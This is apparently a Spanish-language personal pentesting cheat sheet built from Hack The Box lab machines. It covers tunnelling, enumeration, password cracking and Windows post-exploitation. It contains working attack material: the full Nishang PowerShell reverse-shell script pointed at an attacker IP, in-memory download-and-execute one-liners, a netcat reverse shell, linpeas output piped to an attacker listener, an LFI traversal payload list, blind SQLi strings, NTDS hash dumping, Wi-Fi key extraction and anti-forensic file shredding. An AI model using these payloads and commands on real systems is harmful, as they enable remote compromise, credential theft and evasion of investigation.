![image](https://github.com/gecr07/Acordeon/assets/63270579/92c89275-1dfd-41e2-ba62-a2f89265958d)

Ahora quiero ver la repuesta recuerda que al final por detras todo tiene clases entonces:

![image](https://github.com/gecr07/Acordeon/assets/63270579/f08b5052-a678-49fb-9cf5-bd9b4b21cfdf)

Nos va a mostrar el html:

![image](https://github.com/gecr07/Acordeon/assets/63270579/46e077e1-320d-4ca2-b790-d85eb6d0e98d)

## Terminal Shortcuts

```bash

Terminal 

CTRL + A #Ir al incio
CTRL + E # Ir al final 
ALT + B # Una palabra antes (Before)
ALT + F # Para adelante

Man 

CTRl + Shift #Buscar
n # para buscar adelante
shift + n ( osea N) # para buscar hacia atras
g Ir a la primera linea del manual man

TMUX

CTRL + B Shift + ! # Para un panel convertirlo en una ventana nueva.
CTRL + B Shift + [ # Para copiar se hace
Copy mode CTRL + Space # Selecciona 
CTRL + W # Eso es copia
CTRL + B + SHIFT + ] # pega lo copiado
#Buscar
Ya en el copy mode
CTRL + s
CTRL + r
n # para buscar en de abajo para arriba otra concidencia
SHIFT + n # para buscar en orden inverso.
```

> https://superuser.com/questions/231002/how-can-i-search-within-the-output-buffer-of-a-tmux-shell


## Batcat

```bash
batcat file -l ruby
```

## SSH enum

Esto se puede de la version < 7.79 (para abajo)  IGUAL CHECA PORQUE PUEDEN SALIR MAS VERCIONES EN EL FUTURO ESTO ES UNA GUIA NOMAS.

![image](https://github.com/gecr07/Acordeon/assets/63270579/fd6442e6-ffa2-484d-9f73-e8bfca42c944)


Para probar passwords

```
sshpass -p 'passwd' ssh user@127.0.0.1
```

Pero si buscas sshenum python3 salen scripts.

> https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py

![image](https://github.com/gecr07/Acordeon/assets/63270579/b53a5a8f-da0a-449f-8ce8-ca765caca76e)



## Matar procesos (Kill killall)

![image](https://github.com/gecr07/Acordeon/assets/63270579/656f1836-1ecf-4f16-9de6-8532e9051523)

```
CTRL+Z
kill %
```

> El comando killall en Linux se utiliza para enviar una señal de terminación a procesos basándose en sus nombres. A diferencia del comando kill, que requiere especificar el ID del proceso (PID), killall permite matar procesos por su nombre.

```
killall openvpn
```

## HEX a ASCII (xxd)

Para pasar de hex a ascii usa:

```
xxd -ps -r;echo

```

##

## CEWL

Listas de palabras para brute force de lo mismo que esta en la pagina sirve por ejemplo para encontrar el usuario Valentine (machine).

```
cewl -v --depth 2 --write lista.txt http://10.129.44.3/dev/

```


Esto sirve para crear diccionarios en base a las mismas palabras de la pagina.

```
cewl -w cewl-forum.txt -e -a http://forum.bart.htb

‐e, ‐‐email
                     Include email addresses.

 ‐a, ‐‐meta
                     Include meta data.


```

## Sponge

Escribir sobre el mismo archivo que modificaste (bastante util ahorra comandos y no acepta echos cuidado con eso)

```
cat id_rsa | tr -d ' ' | xxd -ps -r | sponge id_rsa
```


## id_rsa (600 y 700)

Son permisos que son validos (600 y 700).  En general, se recomienda que solo el propietario tenga acceso de lectura y escritura al archivo. 

```
chmod 600 id_rsa
```

## JTR (ssh2john)

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

## Chown
En la maquina Goodgames tenemos un ejemplo de esto para la escalada:

```
chown root:root bash
# le pone que el propietario es root y luego : indica que el grupo tambien es root.
``` 
![image](https://github.com/gecr07/Acordeon/assets/63270579/c369ca96-3758-4148-990e-dbd372b75df6)

Ahora para que los grupos puedan leer y escribir

```
chmod g+rw archivo
```

## psexec.py 

Esta herrameinta sirve si tienes un usuario en el grupo Administrators y regresa una shell con permisos de Authority System

```
psexec.py active.htb/administrator@10.10.10.10
```

Otros casos donde me encontre esto:

```
psexec.py WORKGROUP/s4vitar@10.129.228.122 cmd.exe
```

## Dirty Cow

 Esta vulnerablidad esta en kernels viejos. Esta entre el rango 2.6.22 < 3.9

```
searchsploit dirty cow 
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/374d5cb5-50ec-4ffb-b7f0-e431a9a6b9b0)


## Borrado seguro

Para borrar seguro algo asi como una tecnica anti forense

```
shred -zun 10 -v payload.php
```


## GCC compilar

En los exploit casi siempre te dice como compiarlo asi que busca como:

```
cat exploit.c | grep gcc
```

Para la compilacion

```
gcc exploit.c -o dirty_out
```

## Curl

Peticiones GET se puede hacer sin el -X para este tipo de peticiones.

```
curl -s -X GET "http://10.10.0.10/browse.php?file=something.txt"
```

Para enviar peticiones https y evitar que cheque los certificados usa la opcion -k.

Peticiones POST para registrar un usuario.

```
curl -X POST http://internal-01.bart.htb/simple_chat/login_form.php -d "uname=masa&password=masa1234"
```

## Borrar caracteres tr y grep -v

Para borrar caracteres usa el grep -v y el tr -d

```
cat file | tr -d '\n'
grep -v "00 00 00 00"
```

## Dynamic Port Fowarding SSH

Primero vamos a editar el archivo de configuracion de proxychains


```
nano /etc/proxychains.conf

socks4 127.0.0.1 1080

```

Segundo nos vamos a conectar a la maquina por ssh con la opcion -D

```
ssh user@10.10.1.8 -D 1080 # mismo puerto que el socks4 que definimos
```
Y en este ejemplo lo usan para comunicarse con el vncviewer en los puertos 5901

```
proxychains vncviwer -passwd secret_key 127.0.0.1:5901
```
Para usar nmap se tiene que usar la -sT afuerzas TCP connect pero recuerda poner delante el proxychains

```
proxychains nmap -sT -p21,22,80 127.0.0.1
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/77786cdc-0e96-413e-b67f-f033cb50dc1e)


Para usar con Firefox.

![image](https://github.com/gecr07/Acordeon/assets/63270579/78343db1-365d-492e-a870-94108fa2e110)


```
## En el archivo de configuracion

socks4 127.0.0.1 1080

### ssh

ssh -i id_ed25519 strapi@10.10.11.105 -D 1080

#Aun no entiendo por da problemas....

http://localhost:8000/

```

Funciona mejor con un tunnel asi

```
 ssh -i id_ed25519 strapi@10.10.11.105 -L:8000:127.0.0.1:8000
```

Para poder realizar un un tunel socks en otro puero osea ya cuanod saltaste aotro segmento.

```
./chisel client 10.10.1.2 R:8888:socks 
```

## Redirigir trafico 

Puedes usar socat para redirigir el trafico pero hay veces que este no funciona porque solo esta para 64, las librerias de c no son las que usar el binario estatico etc se puede usar nc

```
nc -l 445 -c "nc 172.16.40.5 445"
```

Si el socat se puede usar lo puedes usar tanto para esperar una shell (tipo nc) como para re dirigir todo el trafico.

```
./socat TCP-LISTEN:555,fork TCP:172.16.40.5:555 &

```

##  Revisar puetos en uso (lsof)

Para revisar un puerto si esta en uso:

```
lsof -i:1080 
```

## Certificados SSL

Se puede checar con openssl.

```
openssl s_client -connect 10.10.14.1:443
```

Igual con sslscan 

```
sslscan https://10.10.1.1/
```


## Procmon

Para ver procesos alternativa del pspy

```
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done

```


## Watch 

Para ver comandos cada segundo

```bash

watch -n 1 ls -la /bin/bash

```

## Telnet

A veces es mejor usar telenet en vez de nc consideralo.

```
telnet 10.10.1.14 110
```

## MSFVENOM

Para ver las payloads disponibles.

```
msfvenom -l payloads | grep java
```

## Multiples interfaces

Usa el comando

```
hostname -I

```
## Wget

Para descargar lo que sea copia y pega para que o estes escribiendo siempre lo mismo

```
wget http://10.10.14.80:8000/pspy
```

## Impacket

Tienen todas las herramientas para trabajar con AD entonces busca las tools primero con impacket ejemplo: impacket-secretsdump...

### secretsdump

Para sacar los hashes del ntds.dit recuerda que se necesita el registro system.bin

```
impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
```
## Joomla

Para escanear este CMS usa joomscan

```
joomscan -u http://dev.devvortex.htb

```

## WORDPRESS

Algunas rutas que vale la pena ver son las configuraciones de este:

```
/etc/wordpress/config-default.php
```

Aqui tienes los comandos basicos para enumerar un WP

```
wpscan -v --disable-tls-checks --enumerate u,p --url  https://brainfuck.htb/

```
Si no tienes la API luego no detecta vulnerabilidades para usar la API usa ( tienes que definirla en el .zshrc


```
wpscan --url http://10.10.1.1/blog --enumerate u,vp --plugins.detection aggressive --api-token=$WPSCAN
```


### Enumerar plugins sin WPSCAN ( es un check que se debe de hacer) visto en maquina Tartarsauce

Me ha pasado que wpscan no te da los plugins que existen en la maquina. Se tiene que hacer manualmente.
```
find . -name \*plugin\* | grep -i wp
seclist/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

```

Ojo esta lista ya tiene una ruta /wp-content/plugins entonces has fuzzing asi:


```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.129.1.185:80/webservices/wp/FUZZ 
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/01cbaa09-66af-4c73-b60e-c9c8041a730b)



## lsblk checar particiones

Sirve para ver como esta configurado el disco

```
lsblk

```

## Linpeas

Para que analices en la maquina atacante

```
# Victima
wget 10.10.14.80:8080/linpeas.sh
./linpeas.sh |  nc 10.10.14.80 9002

# Atacante
nc -lvnp 9002 | tee linpeas.out 

```
## Zip

Para comprimir un archivo o carpeta usa

```
zip -r socat.zip socat/
```
Recuerda para comprimir un archivo pues quita la r

```
unzip mi_carpeta.zip
```

## Tar

Para comprimir un archivo con esta herramienta 

```
tar -zcvf /var/tmp/masa_out.gz /var/www/html
###
tar.gz
-z: La opción que indica a tar que debe usar gzip para comprimir el archivo.
-c: La opción que indica a tar que debe crear un nuevo archivo.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar que se creará.

```
Para descomprimir 

```
tar -zxvf masa_out -C /directorio/out
###
-z: La opción que indica a tar que el archivo está comprimido con gzip y debe descomprimirse durante la extracción.
-x: La opción que indica a tar que debe extraer archivos del archivo tar.
-v: La opción "verbose" que proporciona una salida detallada durante el proceso.
-f: La opción que permite especificar el nombre del archivo tar del cual se extraerán los archivos. Debe ir seguido del nombre del archivo.

```

## Bash 

While con un or

```bash

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

```

Fuente > https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

Un if que verifica si la variable tienen valor

```
if [ "$filename" ]; then
echo "El archivos tienen nombre..."
fi
```

## Tomcat

La ruta donde se encuentra el panel de control por defecto en un servido tomcat es:

```
http://localhost:8080/manager/html
```

### Passwords por defecto

```
password

Password1
password1
admin
tomcat
tomcat
manager
role1
tomcat
changethis
Password1
changethis
password
password1
r00t
root
toor
tomcat
s3cret
password1
password
admin
changethis
```

## XCLIP

Se usa para copiar de la consola al porta papeles.

```
cat file| xclip -sel clip 
```

Copiar desde la consola a VM a Windows...

```bash
echo "80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162" |  xclip -i -sel p -f | xclip -i -sel c

#La version corta pero que imprime lo que vas a copiar(cosa que yo no le veo problema)

echo "80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,masa" |  xclip -i -sel p -f

```

> https://unix.stackexchange.com/questions/69111/how-to-target-multiple-selections-with-xclip/69134#69134

## Remplazar caracteres TR 

Para remplazar caracteres usa tr de la siguiente manera

```
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/'
ahora queda asi
user pass
user/pass
```

## Chisel (traerse un puerto para que tu puero local sea el puerto de la maquina victima)

Recordar la maquina atacante es el servidor y la maquina vitima el cliente. En el mismo chisel dice que es reverse port forwarding.

```
#Kali
 ./chisel server --reverse -p 4321

### Windows victima

.\chisel.exe client IPKALI:4321 R:445:127.0.0.1:445

# Ejemplo
./chisel cliente KALI_IP:PORT    PORT_VICTIM:A_DONDE:PORT_KALI
./chisel client 10.10.14.57:1234 R:8000:localhost:8001

```

### socks

Pues para traerte todos los puertos (por asi decirlo)

```
./chisel client 10.0.kali:1234 R:socks

# Te abre un tunel por el puerto 1080 ( por default)
#Primero se utiliza strict chain

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080

## Para escanear mas rapido con nmap

seq 1 65535 | xargs -P -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 10.1.10.12 2>/dev/null

```


# Python

## Trasformar de bytes a  UTF-8

Para trasformar un string que esta en formato de bytes usa decode() y para quitar caracteres.

```python
b'.php'
b'.php'.decode()
b'.php'.decode().strip()
```
Para trasformar de str a bytes entonces seria

```
mi_cadena = "Hola mundo"
mi_cadena_en_bytes = mi_cadena.encode('utf-8')

print(mi_cadena_en_bytes)
```

Para pasar a hex se hace asi.

```
python3
hex(10)
Nos regresa la 0xa
```
![image](https://github.com/gecr07/Acordeon/assets/63270579/35cf4197-6bbb-4803-8d78-315157d1e3ca)



## Keepass (gestor de contraseñas)

La extencion de las bases de datos es ***.kdbx**** 

```
keepass2john CEH.kdbx

john -w=/usr/share/wordlists/rockyou.txt hash


```
Como alternativa esta el keepassxc que tiene interfaz grafica yo creo esta mejor...

![image](https://github.com/gecr07/Acordeon/assets/63270579/b6c243ea-15cc-4793-907d-7a184cad8c1c)


## LFI payloads

Combina esto con wfuzz y podrias probar LFIs aunque siempre intenta manual pero de algo puede servir

```
../
../../
../../../
../../../../
../../../../../
../../../../../
../../../../../../
../../../../../../../..
../../../../../../../../
../../../../../../../../../
../../../../../../../../../../
..\
..\..\
..\..\..\
..\..\..\..\
..\..\..\..\..\
..\..\..\..\..\..\
..\..\..\..\..\..\..\
..\..\..\..\..\..\..\..\..\
..\..\..\..\..\..\..\..\..\..\
..\/
.\/.\/
.\/.\/.\/
.\/.\/.\/.\/
.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/.\/
.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/
%2e%2e%2f
%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
%252e%252e%252f
%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
..././
..././..././
..././..././..././
..././..././..././..././
..././..././..././..././..././
..././..././..././..././..././..././
..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././
....\
....\....\
....\....\....\
....\....\....\....\
....\....\....\....\....\
....\....\....\....\....\....\
....\....\....\....\....\....\....\
....\....\....\....\....\....\....\....\
```

## Proyecctos Opensource

Pues asi como revisas siempre si hay contraseñas por defecto tambien esta bien que intentes ver si el proyecto es open source y si puedes aprobechar eso.


## SQLI Blind

En este ejemplo ya tenemos un usuario valido 'admin' el mensaje si no es correcto es try again si es correcto es Wrong identification. (falafel)

```bash
admin' and substring(username,1,1)='a'-- # va a dar true o el mensaje
admin' and substring(username,2,1)='d'-- # va a dar true o el mensaje
```

## Scrips de bat

Este es el script mas basico de bat

```
@echo off
echo Hola Mundo
pause
```


# Windows

## Version

Saber version de windows desde el registro en caso de que no se pueda usar systeminfo

```
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
```

## Program files

Program Files: Esta carpeta está destinada para los programas de 64 bits. Cuando instalas una aplicación de 64 bits en un sistema de 64 bits, por defecto se ubicará en esta carpeta.

Program Files (x86): Esta carpeta es para los programas de 32 bits. En un sistema operativo de 64 bits, las aplicaciones de 32 bits se instalan en esta carpeta para mantenerlas separadas de las aplicaciones de 64 bits.

## ProgramData

La carpeta C:\ProgramData en Windows es una carpeta del sistema que se utiliza para almacenar datos globales de aplicaciones, es decir, datos que no son específicos de un solo usuario y que pueden ser utilizados por todas las cuentas en el sistema.

## Tree

Este comando es super util permite ver los  directorios como el comanod de linux ideal para buscar cosas

```
tree /F /A
```

## Tareas programadas o Task Scheduler(cron jobs de Windows)

Para mirar estas tareas

```
schtasks /query /fo LIST /v
#
Get-ScheduledTask | Format-Table
```

## Sacar passwords Wifi netsh

Para sacar las claves del wifi usa:

```
netsh wlan show profile

netsh wlan show profile name=nombredelperfil key=clear
```

## Arquitecura x86 o x64

Saber la arquitectura de un sistema ojo es diferente la arquitectura del sistema que del proceso si la maquina es de 32 bit no hay tema pero de 64 puede correr ambos. Ojo ahi

```cmd
echo %PROCESSOR_ARCHITECTURE%
```
Para saber la arquitectura desde powershell

```powershell
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
```

Saber la arquitectura del sistema con "systeminfo"

```cmd
systeminfo
#PS
Get-ComputerInfo
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)


Con powershell este fragmento de codigo lo saque del sherlock.

```
function Get-Architecture {

    # This is the CPU architecture.  Returns "64-bit" or "32-bit".
    $CPUArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture

    # This is the process architecture, e.g. are we an x86 process running on a 64-bit system.  Retuns "AMD64" or "x86".
    $ProcessArchitecture = $env:PROCESSOR_ARCHITECTURE

    return $CPUArchitecture, $ProcessArchitecture

}

```

## Buscar archivos


Esto es desde powershell pero desde cmd solo quita lo primero

```cmd
cmd /c dir /r /s user.txt
```

## Buscar archivos ocultos

Para listar y buscar usa estas opciones

```
dir /a:h
```

En powershell

```
Get-ChildItem -Force
```

Buscar archivos de una extencion 

```
Get-ChildItem -Recurse -Filter *.kdbx -Force | Select-Object FullName
```

## Alternative data streams

![image](https://github.com/gecr07/Acordeon/assets/63270579/408d5854-40cb-4f53-b6b5-c8932c8bd6b1)


Es una manera de esconder cosas y se ve algo como esto:


Para listar este tipo de archivos

```
dir /R
more < hm.txt:root.txt

```



## Reverse shell for windows

> Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.

> https://github.com/samratashok/nishang

###  Nishang (via Invoke-PowerShellTcp.ps1)


Entonces ponemos es linea hasta abajo del archivo con nuestra IP:

```powershell

function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444

```

Para descargar y en memoria:

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
```

### RCE via nc

En kali seclist tiene nc.exe

![image](https://github.com/gecr07/Acordeon/assets/63270579/da729171-7475-4f3c-9968-2aafbc38b221)

De donde s4vitar baja su nc.exe

> https://eternallybored.org/misc/netcat/

```

\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443

```
> https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
> https://www.hackingarticles.in/windows-for-pentester-certutil/
> https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

## Descargar archivos

Algunos comando no se pueden usar debido a las versiones de powershell por ejemplo el siguiente

```
Invoke-WebRequest -Uri 'http://192.168.230.128:8000/iisfinal.txt' -OutFile '.\iisfinal.txt'
```

Y la que por lo que entiendo carga ya el codigo en la memoria

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
```


### Certutil 

Esta herramienta es altamente detectada por windows ten cuidado...


```
certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.txt

```

Hash MD5 de cualquier archivo

```
CertUtil -hashfile CustomerManagerService.exe MD5
```

## HASH SHA512

Para sacar el hash de un archivo

```
Get-FileHash -Path "C:\ruta\al\archivo.txt" -Algorithm SHA512 | Select-Object Hash
```

## Permisos de archivos

Para esto usa icacls

![image](https://github.com/gecr07/Acordeon/assets/63270579/4fd4f074-f35d-4015-9871-a40397c94292)


```
icacls C:\Users\tony\appdata\local\job\job.bat
```

## Copiar un archivo y remplazar

Si existe lo remplazara

```
copy /Y mal.bat C:\Users\tony\appdata\local\job\job.bat
```

## Smb

Para ver los shares disponibles de una ip puedes usar:

![image](https://github.com/gecr07/Acordeon/assets/63270579/c61816ce-e938-4189-b6c1-9aab84145b70)


```
net view \\10.10.14.80
```

Ahora para ver que hay dentro el dir jala igualmente.

```
dir \\10.10.14.80\smbFolder
```
## SMB NULL sessions

Prueba ambas herramientas para estar seguro a veces fallan es mejor probar con ambas

```
smbclient -L 10.10.10.59 -N
```

Y ahora con SQLMAP

```
smbmap -H 10.10.14.12 -u 'null'
```


## Visual studio compilar (Diferentes Frameworks y arquitecturas)

Para compilar con visual estudio diferentes arquitectura y frameworks.


![image](https://github.com/gecr07/Acordeon/assets/63270579/958a95da-9077-4a75-b027-6aea613f819e)


> https://0xdf.gitlab.io/2019/03/05/htb-devel.html


## Enumerar los Net Frameworks

Para saber si compilamos un proyecto y que Net Framework se puede compilar hay dos vias por el reg query y visitando la carpeta. Ojo la del reg por lo que entendi te muestra la version mas alta que se tenga instalado.

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```


Por otra parte ver la carpeta si muestra todos los que estan instalados. (esto lo vi en la maquina DEVEL

```
c:\Windows\Microsoft.NET\Framework>dir /A:D
dir solo mostrara los directorios para esa es la opcion D
```

## Paginas de exploits de windows precompilados (Privilege escalation)

> https://github.com/abatchy17/WindowsExploits

> https://github.com/SecWiki/windows-kernel-exploits

> https://rootrecipe.medium.com/windows-kernel-exploitation-fe268f43bb35

## IIS rutas por defecto

La ruta por defecto (y estaba en la maquina DEVEl)

```
c:\inetpub\wwwroot
# Esta ruta fue donde me llevo cuanod ejecute la reverse shell
C:\windows\system32\inetsrv
```

## IIS OS Recon

Se puede detectar si es Windows o Linux lo que existe por detras ya que en la URL lo que pongas es case insesitive te lleva al mismo lado mientras que en Linux no.

![image](https://github.com/gecr07/Acordeon/assets/63270579/ada17927-0075-4b35-abd5-6fbc67debbc8)



## Powershell rutas

![image](https://github.com/gecr07/Acordeon/assets/63270579/1a37fd88-23c6-4976-97cd-8edc4fe90f23)

Entonces para llamar a powershell desde un proceso de 32bit y que regrese un proc de 64:

```
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
```

Pero el HFS corre en 32 recuerda. La siguiente ruta va a lanzar el ps en 32bits

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

## PowerShell descargar a memoria 

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/iisfinal.txt')
```

## Watson (Exploit Suggester)

Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.


Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.  


![image](https://github.com/gecr07/Acordeon/assets/63270579/6a57ad18-0799-4b95-8063-782b3f5ac01f)

Pues ya esta descontinuado desde el 2021.

> https://github.com/rasta-mouse/Watson


## Sherlock (Exploit Suggester)

Esta es el predesesor de Watson y es un script en powershell ya sabes esta descontinuado casi a la par del Watson

```
Import-Module Sherlock.ps1
Y ya despues que buesque
Find-AllVulns
```
